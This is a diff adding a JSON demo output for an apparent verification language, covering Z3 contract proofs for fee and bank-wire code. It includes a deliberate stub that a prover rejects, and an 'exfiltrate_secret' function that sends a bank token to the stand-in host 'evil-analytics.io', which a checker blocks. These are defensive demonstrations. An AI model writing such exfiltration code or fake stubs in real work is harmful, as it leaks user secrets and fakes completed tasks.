@@ -1,0 +1,69 @@
+{
+  "wasm_size_bytes": 33080,
+  "ingested_nodes": [
+    {
+      "alias": "calc_fee_agent_a",
+      "hash": "3fca2629353975a3c85206cf2f113f298187e0f7300c4b0ee3bb11920a541d3a",
+      "short_hash": "3fca26293539",
+      "deduplicated": false,
+      "obligations_proved": 2,
+      "verify_ms": 285
+    },
+    {
+      "alias": "compute_commission_agent_b",
+      "hash": "3fca2629353975a3c85206cf2f113f298187e0f7300c4b0ee3bb11920a541d3a",
+      "short_hash": "3fca26293539",
+      "deduplicated": true,
+      "obligations_proved": 2,
+      "verify_ms": 322
+    },
+    {
+      "alias": "send_bank_wire",
+      "hash": "644f79bfca377432c6fbac9df722d8f8b400eec5f1158f44cbf4f6e45dba2f98",
+      "short_hash": "644f79bfca37",
+      "deduplicated": false,
+      "obligations_proved": 1,
+      "verify_ms": 137
+    },
+    {
+      "alias": "checkout",
+      "hash": "768a631876e730c7890cc50de243c297b98ab0dcfb1e9da426f046c339fd1fe7",
+      "short_hash": "768a631876e7",
+      "deduplicated": false,
+      "obligations_proved": 3,
+      "verify_ms": 323
+    }
+  ],
+  "payment_source": "// Demo: Semantic Deduplication, Z3 Contract Proofs, and Transitive Security Passport\n\n// Agent A implements fee calculation using its own variable names:\nfn calc_fee_agent_a(amount: i64, rate_bps: i64) -> i64\n  req amount >= 0 && rate_bps >= 0 && rate_bps <= 5000\n  ens result >= 0 && result <= amount / 2\n{\n  let raw = amount * rate_bps;\n  raw / 10000\n}\n\n// Agent B independently writes the exact same mathematical logic with different names & spacing:\nfn compute_commission_agent_b(   sum : i64 ,   bps : i64 ) -> i64\n  req sum >= 0 && bps >= 0 && bps <= 5000\n  ens result >= 0 && result <= sum / 2\n{\n  let product = sum * bps;\n  product / 10000\n}\n\n// Leaf node with explicit scoped network capability and audit logging:\nfn send_bank_wire(token: Secret<str>, net_amount: i64) -[Net(\"api.mybank.com\"), Audit]-> bool\n  req net_amount > 0\n  ens result == true\n{\n  do Audit.record(net_amount);\n  do Net.post(reveal(\"api.mybank.com\", token), net_amount);\n  true\n}\n\n// High-level checkout workflow: Z3 proves modularly that `net > 0` holds before `send_bank_wire`!\nfn checkout(auth_token: Secret<str>, total: i64) -> bool\n  req total > 100\n  ens result == true\n{\n  let fee = calc_fee_agent_a(total, 250);\n  let net = total - fee;\n  send_bank_wire(auth_token, net)\n}\n",
+  "anti_stub_source": "// Anti-Stub Demo: An AI agent attempts to cheat by returning `balance` unchanged\n// instead of deducting `amount`. Infimum's Z3 prover rejects this at compile time\n// with a concrete mathematical counterexample.\n\nfn withdraw_stub(balance: i64, amount: i64) -> i64\n  req amount > 0 && balance >= amount\n  ens result == balance - amount && result >= 0\n{\n  // Fake AI stub: forgot to subtract `amount`!\n  balance\n}\n",
+  "anti_stub_diagnostic": {
+    "code": "E050_CONTRACT_VIOLATION",
+    "phase": "verify",
+    "message": "Postcondition #1 failed for function 'withdraw_stub': ens ((result == (balance - amount)) && (result >= 0))",
+    "span": {
+      "start": 0,
+      "end": 0,
+      "line": 1,
+      "col": 1
+    },
+    "repair_hint": "Stubs and partial implementations are rejected. Update 'withdraw_stub' body so 'ens ((result == (balance - amount)) && (result >= 0))' holds for the counterexample inputs",
+    "counterexample": {
+      "amount": "1",
+      "balance": "1",
+      "result": "1"
+    }
+  },
+  "secret_leak_source": "// Security X-Ray Demo: A compromised or hallucinating AI attempts to exfiltrate\n// a user's bank token (`Secret<str>`) to an unauthorized domain (\"evil-analytics.io\").\n// Infimum's static taint & capability checker blocks compilation before execution.\n\nfn exfiltrate_secret(bank_token: Secret<str>) -[Net(\"evil-analytics.io\")]-> bool {\n  // Attempted domain-mismatch exfiltration:\n  do Net.post(reveal(\"api.mybank.com\", bank_token));\n  true\n}\n",
+  "secret_leak_diagnostic": {
+    "code": "E065_REVEAL_DOMAIN_MISMATCH",
+    "phase": "typecheck",
+    "message": "Function 'exfiltrate_secret' reveals Secret for 'api.mybank.com', but holds Net capabilities for [\"evil-analytics.io\"]",
+    "span": {
+      "start": 0,
+      "end": 0,
+      "line": 1,
+      "col": 1
+    },
+    "repair_hint": "Isolate secret transmission inside a dedicated node whose sole Net capability is Net(\"api.mybank.com\")"
+  }
+}
